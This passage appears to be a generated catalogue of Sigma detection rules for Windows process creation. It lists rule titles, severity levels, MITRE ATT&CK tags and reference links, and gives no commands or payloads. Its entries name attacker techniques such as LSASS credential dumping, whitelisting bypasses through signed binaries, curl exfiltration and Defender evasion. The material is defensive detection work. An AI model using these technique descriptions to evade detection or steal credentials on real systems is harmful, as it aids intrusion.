* https://image.slidesharecdn.com/kheirkhabarovoffzonefinal-181117201458/95/hunting-for-privilege-escalation-in-windows-environment-20-638.jpg

    
### Renamed Whoami Execution
    
    Detects the execution of whoami that has been renamed to a different name to avoid detection

    * Level: critical
    * MITRE: attack.discovery
    * MITRE: attack.t1033
    * MITRE: car.2016-03-001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_renamed_whoami.yml
* https://brica.de/alerts/alert/public/1247926/agent-tesla-keylogger-delivered-inside-a-power-iso-daa-archive/

* https://app.any.run/tasks/7eaba74e-c1ea-400f-9c17-5e30eee89906/

    
### Suspicious Spool Service Child Process
    
    Detects suspicious print spool service (spoolsv.exe) child processes.

    * Level: high
    * MITRE: attack.execution
    * MITRE: attack.t1203
    * MITRE: attack.privilege_escalation
    * MITRE: attack.t1068
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_spoolsv_child_processes.yml
* https://github.com/microsoft/Microsoft-365-Defender-Hunting-Queries/blob/master/Exploits/Print%20Spooler%20RCE/Suspicious%20Spoolsv%20Child%20Process.md

    
### Abusing Findstr for Defense Evasion
    
    Attackers can use findstr to hide their artifacts or search specific strings and evade defense mechanism

    * Level: medium
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1218
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_findstr.yml
* https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Findstr.yml

* https://oddvar.moe/2018/04/11/putting-data-in-alternate-data-streams-and-how-to-execute-it-part-2/

* https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f

    
### Suspicious Rundll32 Without Any CommandLine Params
    
    Detects suspicious start of rundll32.exe without any parameters as found in CobaltStrike beacon activity

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1202
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_rundll32_no_params.yml
* https://www.cobaltstrike.com/help-opsec

    
### Detection of PowerShell Execution via DLL
    
    Detects PowerShell Strings applied to rundll as seen in PowerShdll.dll

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1218.011
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_powershell_dll_execution.yml
* https://github.com/p3nt4/PowerShdll/blob/master/README.md

    
### MMC Spawning Windows Shell
    
    Detects a Windows command line executable started from MMC

    * Level: high
    * MITRE: attack.lateral_movement
    * MITRE: attack.t1021.003
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_mmc_spawn_shell.yml
* https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/

    
### Possible App Whitelisting Bypass via WinDbg/CDB as a Shellcode Runner
    
    Launch 64-bit shellcode from a debugger script file using cdb.exe.

    * Level: medium
    * MITRE: attack.execution
    * MITRE: attack.t1106
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1218
    * MITRE: attack.t1127
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_cdb.yml
* https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Cdb.yml

* http://www.exploit-monday.com/2016/08/windbg-cdb-shellcode-runner.html

    
### Application Whitelisting Bypass via Bginfo
    
    Execute VBscript code that is referenced within the *.bgi file.

    * Level: medium
    * MITRE: attack.execution
    * MITRE: attack.t1059.005
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1218
    * MITRE: attack.t1202
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_bginfo.yml
* https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Bginfo.yml

* https://oddvar.moe/2017/05/18/bypassing-application-whitelisting-with-bginfo/

    
### Suspicious Use of Procdump on LSASS
    
    Detects suspicious uses of the SysInternals Procdump utility by using a special command line parameter in combination with the lsass.exe process. This way we're also able to catch cases in which the attacker has renamed the procdump executable.

    * Level: critical
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1036
    * MITRE: attack.credential_access
    * MITRE: attack.t1003.001
    * MITRE: car.2013-05-009
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_procdump_lsass.yml
* Internal Research

    
### Suspicious Process Start Locations
    
    Detects suspicious process run from unusual locations

    * Level: medium
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1036
    * MITRE: car.2013-05-002
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_run_locations.yml
* https://car.mitre.org/wiki/CAR-2013-05-002

    
### Change Default File Association
    
    When a file is opened, the default program used to open the file (also called the file association or handler) is checked. File association selections are stored in the Windows Registry and can be edited by users, administrators, or programs that have Registry access or by administrators using the built-in assoc utility. Applications can modify the file association for a given file extension to call an arbitrary program when a file with the given extension is opened.

    * Level: low
    * MITRE: attack.persistence
    * MITRE: attack.t1546.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_change_default_file_association.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1546.001/T1546.001.md

    
### Using AppVLP To Circumvent ASR File Path Rule
    
    Application Virtualization Utility is included with Microsoft Office. We are able to abuse "AppVLP" to execute shell commands.
Normally, this binary is used for Application Virtualization, but we can use it as an abuse binary to circumvent the ASR file path rule folder
or to mark a file as a system file.


    * Level: medium
    * MITRE: attack.t1218
    * MITRE: attack.defense_evasion
    * MITRE: attack.execution
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/process_creation_win_asr_bypass_via_appvlp_re.yml
    
### DumpStack.log Defender Evasion
    
    Detects the use of the filename DumpStack.log to evade Microsoft Defender

    * Level: critical
    * MITRE: attack.defense_evasion
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_dumpstack_log_evasion.yml
* https://twitter.com/mrd0x/status/1479094189048713219

    
### Indirect Command Execution By Program Compatibility Wizard
    
    Detect indirect command execution via Program Compatibility Assistant pcwrun.exe

    * Level: low
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1218
    * MITRE: attack.execution
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_indirect_cmd_compatibility_assistant.yml
* https://twitter.com/pabraeken/status/991335019833708544

* https://lolbas-project.github.io/lolbas/Binaries/Pcwrun/

    
### GatherNetworkInfo.vbs Script Usage
    
    Adversaries can abuse of C:\Windows\System32\gatherNetworkInfo.vbs script along with cscript.exe to gather information about the target

    * Level: medium
    * MITRE: attack.discovery
    * MITRE: attack.group_policy_discovery
    * MITRE: attack.execution
    * MITRE: attack.command_and_scripting_interpreter
    * MITRE: attack.visual_basic
    * MITRE: attack.t1059.005
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_lolbin_cscript_gathernetworkinfo.yml
* https://posts.slayerlabs.com/living-off-the-land/#gathernetworkinfovbs

    
### Suspicious LSASS Process Clone
    
    Detects a suspicious LSASS process process clone that could be a sign of process dumping activity

    * Level: critical
    * MITRE: attack.credential_access
    * MITRE: attack.t1003
    * MITRE: attack.t1003.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_lsass_clone.yml
* https://www.matteomalvica.com/blog/2019/12/02/win-defender-atp-cred-bypass/

* https://twitter.com/Hexacorn/status/1420053502554951689

* https://twitter.com/SBousseaden/status/1464566846594691073?s=20

    
### Disable Windows IIS HTTP Logging
    
    Disables HTTP logging on a Windows IIS web server as seen by Threat Group 3390 (Bronze Union)

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1562.002
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_iis_http_logging.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1562.002/T1562.002.md#atomic-test-1---disable-windows-iis-http-logging

    
### Net.exe User Account Creation
    
    Identifies creation of local users via the net.exe command.

    * Level: medium
    * MITRE: attack.persistence
    * MITRE: attack.t1136.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_net_user_add.yml
* https://eqllib.readthedocs.io/en/latest/analytics/014c3f51-89c6-40f1-ac9c-5688f26090ab.html

* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1136.001/T1136.001.md

    
### Recon Information for Export with Command Prompt
    
    Once established within a system or network, an adversary may use automated techniques for collecting internal data.

    * Level: medium
    * MITRE: attack.collection
    * MITRE: attack.t1119
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_recon.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1119/T1119.md

    
### Imports Registry Key From a File
    
    Detects the import of the specified file to the registry with regedit.exe.

    * Level: medium
    * MITRE: attack.t1112
    * MITRE: attack.defense_evasion
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_regedit_import_keys.yml
* https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Regedit.yml

* https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f

    
### Mounted Windows Admin Shares with net.exe
    
    Detects when an admin share is mounted using net.exe

    * Level: medium
    * MITRE: attack.lateral_movement
    * MITRE: attack.t1021.002
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_net_use_admin_share.yml
* https://drive.google.com/file/d/1lKya3_mLnR3UQuCoiYruO3qgu052_iS_/view

    
### Renamed ProcDump
    
    Detects the execution of a renamed ProcDump executable often used by attackers or malware

    * Level: critical
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1036.003
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_renamed_procdump.yml
* https://docs.microsoft.com/en-us/sysinternals/downloads/procdump

    
### Suspect Svchost Activity
    
    It is extremely abnormal for svchost.exe to spawn without any CLI arguments and is normally observed when a malicious process spawns the process and injects code into the process memory space.

    * Level: critical
    * MITRE: attack.defense_evasion
    * MITRE: attack.privilege_escalation
    * MITRE: attack.t1055
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_svchost_no_cli.yml
* https://securitybytes.io/blue-team-fundamentals-part-two-windows-processes-759fe15965e2

    
### Mimikatz Command Line
    
    Detection well-known mimikatz command line arguments

    * Level: medium
    * MITRE: attack.credential_access
    * MITRE: attack.t1003.001
    * MITRE: attack.t1003.002
    * MITRE: attack.t1003.004
    * MITRE: attack.t1003.005
    * MITRE: attack.t1003.006
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_mimikatz_command_line.yml
* https://www.slideshare.net/heirhabarov/hunting-for-credentials-dumping-in-windows-environment

* https://tools.thehacker.recipes/mimikatz/modules

    
### Winnti Pipemon Characteristics
    
    Detects specific process characteristics of Winnti Pipemon malware reported by ESET

    * Level: critical
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1574.002
    * MITRE: attack.g0044
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_apt_winnti_pipemon.yml
* https://www.welivesecurity.com/2020/05/21/no-game-over-winnti-group/

    
### Fsutil Drive Enumeration
    
    Attackers may leverage fsutil to enumerated connected drives.

    * Level: low
    * MITRE: attack.peripheral_device_discovery
    * MITRE: attack.t1120
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_fsutil_drive_enumeration.yml
* Turla has used fsutil fsinfo drives to list connected drives. https://attack.mitre.org/techniques/T1120/

* https://github.com/elastic/detection-rules/blob/414d32027632a49fb239abb8fbbb55d3fa8dd861/rules/windows/discovery_peripheral_device.toml

    
### CrackMapExec PowerShell Obfuscation
    
    The CrachMapExec pentesting framework implements a PowerShell obfuscation with some static strings detected by this rule.

    * Level: high
    * MITRE: attack.execution
    * MITRE: attack.t1059.001
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1027.005
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_crackmapexec_powershell_obfuscation.yml
* https://github.com/byt3bl33d3r/CrackMapExec

* https://github.com/byt3bl33d3r/CrackMapExec/blob/0a49f75347b625e81ee6aa8c33d3970b5515ea9e/cme/helpers/powershell.py#L242

    
### WMIExec VBS Script
    
    Detects suspicious file execution by wscript and cscript

    * Level: critical
    * MITRE: attack.execution
    * MITRE: attack.g0045
    * MITRE: attack.t1059.005
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_apt_cloudhopper.yml
* https://www.pwc.co.uk/cyber-security/pdf/cloud-hopper-annex-b-final.pdf

    
### Suspicious Nmap Execution
    
    Adversaries may attempt to get a listing of services running on remote hosts, including those that may be vulnerable to remote software exploitation

    * Level: high
    * MITRE: attack.discovery
    * MITRE: attack.t1046
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_nmap.yml
* https://nmap.org/

* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1046/T1046.md#atomic-test-3---port-scan-nmap-for-windows

    
### Blue Mockingbird
    
    Attempts to detect system changes made by Blue Mockingbird

    * Level: high
    * MITRE: attack.execution
    * MITRE: attack.t1112
    * MITRE: attack.t1047
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_mal_blue_mockingbird.yml
* https://redcanary.com/blog/blue-mockingbird-cryptominer/

    
### Suspicious Usage of the Manage-bde.wsf Script
    
    Detects a usage of the manage-bde.wsf script that may indicate an attempt of proxy execution from script

    * Level: medium
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1216
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_manage_bde_lolbas.yml
* https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSScripts/Manage-bde.yml

* https://gist.github.com/bohops/735edb7494fe1bd1010d67823842b712

* https://twitter.com/bohops/status/980659399495741441

* https://twitter.com/JohnLaTwC/status/1223292479270600706

* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1216/T1216.md

    
### CreateMiniDump Hacktool
    
    Detects the use of CreateMiniDump hack tool used to dump the LSASS process memory for credential extraction on the attacker's machine

    * Level: high
    * MITRE: attack.credential_access
    * MITRE: attack.t1003.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_hktl_createminidump.yml
* https://ired.team/offensive-security/credential-access-and-credential-dumping/dumping-lsass-passwords-without-mimikatz-minidumpwritedump-av-signature-bypass

    
### CobaltStrike Process Patterns
    
    Detects process patterns found in Cobalt Strike beacon activity (see reference for more details) and also cases in which a China Chopper like webshell is used to run whoami

    * Level: high
    * MITRE: attack.execution
    * MITRE: attack.t1059
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_cobaltstrike_process_patterns.yml
* https://hausec.com/2021/07/26/cobalt-strike-and-tradecraft/

* https://thedfirreport.com/2021/08/29/cobalt-strike-a-defenders-guide/

    
### Schtasks From Suspicious Folders
    
    Detects scheduled task creations that have suspicious action command and folder combinations

    * Level: high
    * MITRE: attack.execution
    * MITRE: attack.t1053.005
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_schtasks_folder_combos.yml
* https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/lazarus-dream-job-chemical

    
### Suspicious Rundll32 Setupapi.dll Activity
    
    setupapi.dll library provide InstallHinfSection function for processing INF files. INF file may contain instructions allowing to create values in the registry, modify files and install drivers. This technique could be used to obtain persistence via modifying one of Run or RunOnce registry keys, run process or use other DLLs chain calls (see references) InstallHinfSection function in setupapi.dll calls runonce.exe executable regardless of actual content of INF file.

    * Level: medium
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1218.011
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_rundll32_setupapi_installhinfsection.yml
* https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Setupapi.yml

* https://gist.githubusercontent.com/bohops/0cc6586f205f3691e04a1ebf1806aabd/raw/baf7b29891bb91e76198e30889fbf7d6642e8974/calc_exe.inf

* https://raw.githubusercontent.com/huntresslabs/evading-autoruns/master/shady.inf

* https://twitter.com/Z3Jpa29z/status/1313742350292746241?s=20

    
### Invoke-Obfuscation STDIN+ Launcher
    
    Detects Obfuscated use of stdin to execute PowerShell

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1027
    * MITRE: attack.execution
    * MITRE: attack.t1059.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_invoke_obfuscation_stdin.yml
* https://github.com/Neo23x0/sigma/issues/1009

    
### Suspicious ScreenSave Change by Reg.exe
    
    Adversaries may establish persistence by executing malicious content triggered by user inactivity.
Screensavers are programs that execute after a configurable time of user inactivity and consist of Portable Executable (PE) files with a .scr file extension


    * Level: medium
    * MITRE: attack.privilege_escalation
    * MITRE: attack.t1546.002
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_screensaver_reg.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1546.002/T1546.002.md

* https://www.welivesecurity.com/wp-content/uploads/2017/08/eset-gazer.pdf

    
### SyncAppvPublishingServer VBS Execute Arbitrary PowerShell Code
    
    Executes arbitrary PowerShell code using SyncAppvPublishingServer.vbs

    * Level: medium
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1218
    * MITRE: attack.t1216
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_syncappvpublishingserver_vbs_execute_powershell.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1216/T1216.md

* https://lolbas-project.github.io/lolbas/Binaries/Syncappvpublishingserver/

    
### Regsvr32 Anomaly
    
    Detects various anomalies in relation to regsvr32.exe

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1218.010
    * MITRE: car.2019-04-002
    * MITRE: car.2019-04-003
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_regsvr32_anomalies.yml
* https://subt0x10.blogspot.de/2017/04/bypass-application-whitelisting-script.html

* https://app.any.run/tasks/34221348-072d-4b70-93f3-aa71f6ebecad/

    
### Conti Ransomware Execution
    
    Conti ransomware command line ioc

    * Level: critical
    * MITRE: attack.impact
    * MITRE: attack.s0575
    * MITRE: attack.t1486
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_conti_cmd_ransomware.yml
* https://news.sophos.com/en-us/2021/09/03/conti-affiliates-use-proxyshell-exchange-exploit-in-ransomware-attacks/

* https://twitter.com/VK_Intel/status/1447795359900704769?t=Xz7vaLTvaaCZ5kHoZa6gMw&s=19

    
### Verclsid.exe Runs COM Object
    
    Detects when verclsid.exe is used to run COM object via GUID

    * Level: medium
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1218
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_verclsid_runs_com.yml
* https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Verclsid.yml

* https://gist.github.com/NickTyrer/0598b60112eaafe6d07789f7964290d5

* https://bohops.com/2018/08/18/abusing-the-com-registry-structure-part-2-loading-techniques-for-evasion-and-persistence/

    
### Enumeration for Credentials in Registry
    
    Adversaries may search the Registry on compromised systems for insecurely stored credentials.
The Windows Registry stores configuration information that can be used by the system or other programs.
Adversaries may query the Registry looking for credentials and passwords that have been stored for use by other programs or services


    * Level: medium
    * MITRE: attack.credential_access
    * MITRE: attack.t1552.002
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_enumeration_for_credentials_in_registry.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1552.002/T1552.002.md

    
### Microsoft Workflow Compiler
    
    Detects invocation of Microsoft Workflow Compiler, which may permit the execution of arbitrary unsigned code.

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.execution
    * MITRE: attack.t1127
    * MITRE: attack.t1218
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_workflow_compiler.yml
* https://posts.specterops.io/arbitrary-unsigned-code-execution-vector-in-microsoft-workflow-compiler-exe-3d9294bc5efb

* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218/T1218.md

    
### Remote Procedure Call Service Anomaly
    
    Detects suspicious remote procedure call (RPC) service anomalies based on the spawned sub processes (long shot to detect the exploitation of vulnerabilities like CVE-2022-26809)

    * Level: high
    * MITRE: attack.initial_access
    * MITRE: attack.t1190
    * MITRE: attack.execution
    * MITRE: attack.t1569.002
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_rpcss_anomalies.yml
* https://msrc.microsoft.com/update-guide/vulnerability/CVE-2022-26809

* https://www.bleepingcomputer.com/startups/RpcSs.exe-14544.html

* https://twitter.com/cyb3rops/status/1514217991034097664

    
### Winrar Execution in Non-Standard Folder
    
    Detects a suspicious winrar execution in a folder which is not the default installation folder

    * Level: high
    * MITRE: attack.collection
    * MITRE: attack.t1560.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_winrar_execution.yml
* https://twitter.com/cyb3rops/status/1460978167628406785

    
### Base64 Encoded Reflective Assembly Load
    
    Detects base64 encoded .NET reflective loading of Assembly

    * Level: high
    * MITRE: attack.execution
    * MITRE: attack.t1059.001
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1027
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_base64_reflective_assembly_load.yml
* https://github.com/Neo23x0/Raccine/blob/main/yara/mal_revil.yar

    
### Suspicious Findstr 385201 Execution
    
    Discovery of an installed Sysinternals Sysmon service using driver altitude (even if the name is changed).

    * Level: high
    * MITRE: attack.discovery
    * MITRE: attack.t1518.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_findstr_385201.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1518.001/T1518.001.md#atomic-test-5---security-software-discovery---sysmon-service

    
### Winnti Malware HK University Campaign
    
    Detects specific process characteristics of Winnti malware noticed in Dec/Jan 2020 in a campaign against Honk Kong universities

    * Level: critical
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1574.002
    * MITRE: attack.g0044
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_apt_winnti_mal_hk_jan20.yml
* https://www.welivesecurity.com/2020/01/31/winnti-group-targeting-universities-hong-kong/

    
### Bad Opsec Defaults Sacrificial Processes With Improper Arguments
    
    Detects attackers using tooling with bad opsec defaults e.g. spawning a sacrificial process to inject a capability into the process without taking into account how the process is normally run, one trivial example of this is using rundll32.exe without arguments as a sacrificial process (default in CS, now highlighted by c2lint), running WerFault without arguments (Kraken - credit am0nsec), and other examples.

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1218.011
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_bad_opsec_sacrificial_processes.yml
* https://blog.malwarebytes.com/malwarebytes-news/2020/10/kraken-attack-abuses-wer-service/

* https://www.cobaltstrike.com/help-opsec

* https://twitter.com/CyberRaiju/status/1251492025678983169

* https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/regsvr32

* https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/rundll32

* https://docs.microsoft.com/en-us/dotnet/framework/tools/regasm-exe-assembly-registration-tool

* https://docs.microsoft.com/en-us/dotnet/framework/tools/regsvcs-exe-net-services-installation-tool#feedback

    
### HH.exe Execution
    
    Identifies usage of hh.exe executing recently modified .chm files.

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1218.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_hh_chm.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218.001/T1218.001.md

* https://eqllib.readthedocs.io/en/latest/analytics/b25aa548-7937-11e9-8f5c-d46d6d62a49e.html

    
### Suspicious Scheduled Task Creation Involving Temp Folder
    
    Detects the creation of scheduled tasks that involves a temporary folder and runs only once

    * Level: high
    * MITRE: attack.execution
    * MITRE: attack.persistence
    * MITRE: attack.t1053.005
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_schtask_creation_temp_folder.yml
* https://discuss.elastic.co/t/detection-and-response-for-hafnium-activity/266289/3

    
### Suspicious Curl File Upload
    
    Detects a suspicious curl process start the adds a file to a web request

    * Level: medium
    * MITRE: attack.exfiltration
    * MITRE: attack.t1567
    * MITRE: attack.t1105
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_curl_fileupload.yml
* https://twitter.com/d1r4c/status/1279042657508081664

* https://medium.com/@petehouston/upload-files-with-curl-93064dcccc76

* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1105/T1105.md#atomic-test-19---curl-upload-file

* https://curl.se/docs/manpage.html

    
### Office Applications Spawning Wmi Cli
    
    Initial execution of malicious document calls wmic to execute the file with regsvr32

    * Level: high
    * MITRE: attack.t1204.002
    * MITRE: attack.t1047
    * MITRE: attack.t1218.010
    * MITRE: attack.execution
    * MITRE: attack.defense_evasion
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_office_applications_spawning_wmi_commandline.yml
* https://thedfirreport.com/2021/03/29/sodinokibi-aka-revil-ransomware/

* https://github.com/vadim-hunter/Detection-Ideas-Rules/blob/main/Threat%20Intelligence/The%20DFIR%20Report/20210329_Sodinokibi_(aka_REvil)_Ransomware.yaml

    
### Windows 10 Scheduled Task SandboxEscaper 0-day
    
    Detects Task Scheduler .job import arbitrary DACL write\par

    * Level: high
    * MITRE: attack.privilege_escalation
    * MITRE: attack.t1053.005
    * MITRE: car.2013-08-001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_win10_sched_task_0day.yml
* https://github.com/SandboxEscaper/polarbearrepo/tree/master/bearlpe

    
### Suspicious Kernel Dump Using Dtrace
    
    Detects suspicious way to dump the kernel on Windows systems using dtrace.exe, which is available on Windows systems since Windows 10 19H1

    * Level: high
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_dtrace_kernel_dump.yml
* https://twitter.com/0gtweet/status/1474899714290208777?s=12

* https://docs.microsoft.com/en-us/windows-hardware/drivers/devtest/dtrace

    
### Copy from Volume Shadow Copy
    
    Detects a copy execution that targets a shadow copy (sometimes used to copy registry hives that are in use)

    * Level: medium
    * MITRE: attack.impact
    * MITRE: attack.t1490
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_cmd_shadowcopy_access.yml
* https://twitter.com/vxunderground/status/1423336151860002816?s=20

* https://www.virustotal.com/gui/file/03e9b8c2e86d6db450e5eceec057d7e369ee2389b9daecaf06331a95410aa5f8/detection

    
### Shadow Copies Access via Symlink
    
    Shadow Copies storage symbolic link creation using operating systems utilities

    * Level: medium
    * MITRE: attack.credential_access
    * MITRE: attack.t1003.002
    * MITRE: attack.t1003.003
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_shadow_copies_access_symlink.yml
* https://www.slideshare.net/heirhabarov/hunting-for-credentials-dumping-in-windows-environment

    
### UNC2452 Process Creation Patterns
    
    Detects a specific process creation patterns as seen used by UNC2452 and provided by Microsoft as Microsoft Defender ATP queries

    * Level: critical
    * MITRE: attack.execution
    * MITRE: attack.t1059.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_apt_unc2452_cmds.yml
* https://www.microsoft.com/security/blog/2021/01/20/deep-dive-into-the-solorigate-second-stage-activation-from-sunburst-to-teardrop-and-raindrop/

    
### Suspicious Csi.exe Usage
    
    Csi.exe is a signed binary from Microsoft that comes with Visual Studio and provides C# interactive capabilities. It can be used to run C# code from a file passed as a parameter in command line. Early version of this utility provided with Microsoft “Roslyn” Community Technology Preview was named 'rcsi.exe'

    * Level: medium
    * MITRE: attack.execution
    * MITRE: attack.t1072
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1218
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_csi.yml
* https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Csi.yml

* https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Rcsi.yml

* https://enigma0x3.net/2016/11/21/bypassing-application-whitelisting-by-using-rcsi-exe/

* https://twitter.com/Z3Jpa29z/status/1317545798981324801

    
### Suspicious VBoxDrvInst.exe Parameters
    
